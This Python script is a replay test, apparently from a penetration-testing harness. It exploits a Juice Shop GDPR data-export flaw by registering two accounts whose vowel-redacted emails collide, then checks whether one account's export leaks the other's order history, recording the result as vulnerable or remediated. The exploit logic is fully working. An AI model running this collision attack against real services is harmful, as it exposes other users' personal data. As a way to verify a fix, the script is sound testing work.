#!/usr/bin/env python3
"""pt36: GDPR data export looks up order history by a vowel-redacted
email, which different real accounts can be made to collide on,
leaking one account's real order history into a completely unrelated
account's export.

Found white-box via the challenge catalog (dataExportChallenge, "GDPR
Data Theft", hint: "trick the regular Data Export to give you more
than actually belongs to you"). routes/dataExport.ts:

    const updatedEmail = email.replace(/[aeiou]/gi, '*')
    db.ordersCollection.find({ email: updatedEmail })

routes/order.ts stores orders under this same redacted form. Two
accounts whose local-parts redact identically, for example "aei<n>"
and "uoi<n>" both becoming "***<n>", collide completely: an order
from one is returned in the other's export.

No injection, no IDOR parameter tampering, just a chosen registration
email. The same lookup pattern also exists in /rest/order-history
(routes/orderHistory.ts), unaffected by this item's fix, out of scope
here.

Standard library only (urllib, json).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt36-001.json"


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, email: str, password: str) -> tuple[str, str]:
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    return body["authentication"]["token"], str(body["authentication"]["bid"])


def _place_order(target: str, token: str, bid: str) -> str | None:
    import base64
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    user_id = json.loads(base64.urlsafe_b64decode(padded))["data"]["id"]

    _request("POST", f"{target}/api/BasketItems", token=token, body={"ProductId": 1, "BasketId": bid, "quantity": 1})
    status, body = _request("POST", f"{target}/rest/basket/{bid}/checkout", token=token, body={
        "UserId": user_id, "orderDetails": {"addressId": 1},
    })
    return body.get("orderConfirmation") if status == 200 else None


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))
    password = "Pt36Pass123!"

    victim_email = f"aei{stamp}@flatline.test"
    attacker_email = f"uoi{stamp}@flatline.test"  # redacts to the same '***<stamp>' pattern

    victim_token, victim_bid = _register_and_login(target, victim_email, password)
    victim_order_id = _place_order(target, victim_token, victim_bid)

    attacker_token, _ = _register_and_login(target, attacker_email, password)
    export_status, export_body = _request("POST", f"{target}/rest/user/data-export", token=attacker_token, body={"format": 1})

    attacker_sees_victim_order = False
    if export_status == 200 and victim_order_id:
        try:
            user_data = json.loads(export_body["userData"])
            attacker_sees_victim_order = any(o.get("orderId") == victim_order_id for o in user_data.get("orders", []))
        except Exception:
            attacker_sees_victim_order = False

    if export_status == 200 and attacker_sees_victim_order:
        status = "VULNERABLE"
        summary = "An account with no orders of its own received another, unrelated account's real order in its own GDPR data export, via a chosen colliding email."
    elif export_status == 200 and not attacker_sees_victim_order:
        status = "REMEDIATED"
        summary = "The attacker's export did not include the victim's order; the lookup no longer collides across distinct accounts."
    else:
        status = "ERROR"
        summary = f"Inconclusive: export_status={export_status}, victim_order_id={victim_order_id}."

    # Legitimate case: the victim's own export still includes their own
    # real order.
    legit_export_status, legit_export_body = _request("POST", f"{target}/rest/user/data-export", token=victim_token, body={"format": 1})
    legitimate_own_order_visible = False
    if legit_export_status == 200 and victim_order_id:
        try:
            legit_user_data = json.loads(legit_export_body["userData"])
            legitimate_own_order_visible = any(o.get("orderId") == victim_order_id for o in legit_user_data.get("orders", []))
        except Exception:
            legitimate_own_order_visible = False

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "export_http_status": export_status,
        "attacker_sees_victim_order": attacker_sees_victim_order,
        "summary": summary,
        "legitimate_own_order_visible": legitimate_own_order_visible,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt36-gdpr-data-export-collision", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
